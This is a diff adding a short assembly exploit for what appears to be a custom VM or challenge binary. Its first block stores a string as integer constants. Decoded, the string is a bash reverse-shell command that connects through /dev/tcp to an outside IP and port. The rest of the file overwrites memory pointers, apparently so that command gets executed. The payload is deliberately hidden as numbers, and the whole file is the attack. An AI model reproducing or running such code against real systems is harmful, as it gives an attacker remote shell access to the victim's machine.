@@ -1,0 +1,52 @@
+#include <constants.rh>
+#include <crctools.rh>
+#include <math.rh>
+#include <util.rh>
+; vim: syntax=fasm
+
+_start:
+    mov    [r0],#1752392034
+    add    r0,#4
+    mov    [r0],#543370528
+    add    r0,#4
+    mov    [r0],#1935761954
+    add    r0,#4
+    mov    [r0],#540942440
+    add    r0,#4
+    mov    [r0],#1986356271
+    add    r0,#4
+    mov    [r0],#1885565999
+    add    r0,#4
+    mov    [r0],#808726831
+    add    r0,#4
+    mov    [r0],#858861870
+    add    r0,#4
+    mov    [r0],#926298414
+    add    r0,#4
+    mov    [r0],#892875054
+    add    r0,#4
+    mov    [r0],#875836463
+    add    r0,#4
+    mov    [r0],#1043341364
+    add    r0,#4
+    mov    [r0],#2240806
+    add    r0,#4
+    mov    r0,#0 
+    add     r0,#445497328
+    mov     r1,r0
+    add     r1,#4111392
+    mov     r2,[r1]
+    mov     r1,r2
+    sub     r1,#619536
+    add     r1,#324672 
+    mov     r2,r0
+    add     r2,#4118760
+    mov     [r2],r1
+
+    add     r2,#4
+    mov     r1,r0
+    add     r1,#4111396
+    mov     r4,[r1]
+    mov     r1,r4 
+    mov     [r2],r1
+    call    $_success
